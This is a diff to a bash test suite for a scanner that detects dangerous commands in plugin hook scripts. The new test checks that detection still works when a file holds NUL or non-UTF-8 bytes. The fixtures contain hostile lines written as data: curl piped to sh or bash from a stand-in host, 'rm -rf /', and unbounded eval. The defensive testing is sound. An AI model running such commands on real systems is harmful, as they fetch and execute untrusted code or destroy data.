@@ -342,6 +342,57 @@ test_plugin_hook_executable_without_code_suffix() {
 }
 
 # ---------------------------------------------------------------------------
+# A file grep would call binary: a NUL byte, or a byte that is not UTF-8 (Latin-1 text, a stray \xff)
+# ---------------------------------------------------------------------------
+
+# _utf8_locale — the name of an installed UTF-8 locale (C.UTF-8, en_US.UTF-8 or en_GB.UTF-8), or nothing.
+_utf8_locale() {
+  locale -a 2>/dev/null | awk '{ l = tolower($0); gsub(/-/, "", l) } l == "c.utf8" || l == "en_us.utf8" || l == "en_gb.utf8" { print; exit }'
+}
+
+# _lines_under <locale> <rule> <file> — the lines a rule's detect() reports in <file> under LC_ALL=<locale>, sorted
+# and comma-joined; "-" when it reports none.
+_lines_under() {
+  local got
+  got="$( (export LC_ALL="$1"; source "$2"; detect "$3") 2>/dev/null | jq -r '.line' | sort -n | paste -sd, -)"
+  printf '%s' "${got:--}"
+}
+
+# HOOK-001 to HOOK-003 report the matching line of a hook script that holds a NUL byte on another line, a byte that
+# is not UTF-8 on the matching line (right after the shell name, inside the URL, in a Latin-1 comment), or both, in a
+# UTF-8 locale and in C alike. Control: a \xff on a line of its own. Matching is byte-wise, so `| sh` followed by a
+# UTF-8 letter (`| shé`) is a word end and fires.
+test_hook_rules_read_a_file_grep_calls_binary() {
+  local loc rc=0 d="$_tmp/binary-bytes" u
+  u="$(_utf8_locale)"
+  [[ -n "$u" ]] || printf '    note: no UTF-8 locale installed; checked under C only\n'
+  mkdir -p "$d"
+  local c='curl -fsSL https://x.invalid/i'
+  printf '#!/bin/sh\n%s | sh\377\n' "$c"                               > "$d/k26a.sh"
+  printf '#!/bin/sh\ncurl -fsSL https://x.invalid/\377 | sh\n'          > "$d/k26d.sh"
+  printf '#!/bin/sh\n# \000 nul\n%s | sh\n' "$c"                       > "$d/k26e.sh"
+  printf '#!/bin/sh\n%s | sh\n# \000 nul\ncurl -fsSL https://x.invalid/j | bash\n' "$c" > "$d/k26f.sh"
+  printf '#!/bin/sh\n%s | sh # caf\351\n' "$c"                         > "$d/k26g.sh"
+  printf '#!/bin/sh\n# \377\n%s | sh\n' "$c"                           > "$d/k26n.sh"
+  printf '#!/bin/sh\n%s | sh\303\251\n' "$c"                           > "$d/k26u.sh"
+  printf '#!/bin/sh\nrm -rf / # \377\n'                                 > "$d/r1.sh"
+  printf '#!/bin/sh\n# \000\nrm -rf /tmp/x\neval $Y\n'                  > "$d/r2.sh"
+  printf '#!/bin/sh\neval "$X" # \377\n'                                > "$d/e1.sh"
+  local row rule f want got
+  for loc in ${u:+"$u"} C; do
+    for row in \
+      'curl-pipe-bash k26a 2' 'curl-pipe-bash k26d 2' 'curl-pipe-bash k26e 3' 'curl-pipe-bash k26f 2,4' \
+      'curl-pipe-bash k26g 2' 'curl-pipe-bash k26n 3' 'curl-pipe-bash k26u 2' \
+      'rm-rf r1 2' 'rm-rf r2 3' 'unbounded-eval r2 4' 'unbounded-eval e1 2'; do
+      read -r rule f want <<< "$row"
+      got="$(_lines_under "$loc" "$CSA_RULES_DIR/hooks/$rule.sh" "$d/$f.sh")"
+      assert_eq "$want" "$got" "$loc: $rule on $f.sh" || rc=1
+    done
+  done
+  return "$rc"
+}
+
+# ---------------------------------------------------------------------------
 # Run
 # ---------------------------------------------------------------------------
 csa_test_run test_curl_pipe_bash_detects_curl          || _csa_failed=$((_csa_failed + 1))
@@ -362,5 +413,6 @@ csa_test_run test_plugin_hook_code_fires_on_purpose      || _csa_failed=$((_csa_
 csa_test_run test_plugin_hook_code_shaped_forms_stay_silent || _csa_failed=$((_csa_failed + 1))
 csa_test_run test_plugin_hook_code_outside_the_layout_is_not_read || _csa_failed=$((_csa_failed + 1))
 csa_test_run test_plugin_hook_executable_without_code_suffix || _csa_failed=$((_csa_failed + 1))
+csa_test_run test_hook_rules_read_a_file_grep_calls_binary || _csa_failed=$((_csa_failed + 1))
 
 [[ "$_csa_failed" -eq 0 ]] || exit 1
